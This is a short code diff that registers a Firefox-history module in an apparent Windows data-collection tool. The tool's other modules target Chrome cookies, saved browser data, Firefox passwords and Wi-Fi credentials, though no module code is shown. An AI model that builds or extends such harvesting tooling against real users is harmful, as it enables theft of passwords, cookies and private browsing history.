@@ -17,6 +17,7 @@ from modules.windows.chrome.cookie import WindowsChromeCookie
 from modules.windows.chrome.saved_data import WindowsChromeSavedData
 
 from modules.windows.firefox.password import WindowsFirefoxPassword
+from modules.windows.firefox.history import WindowsFirefoxHistory
 
 from modules.windows.wifi import WindowsWifi
 
@@ -35,6 +36,7 @@ modules = [
 		WindowsChromeSavedData(),
 
 		WindowsFirefoxPassword(),
+		WindowsFirefoxHistory(),
 
 		WindowsWifi(),
 	]
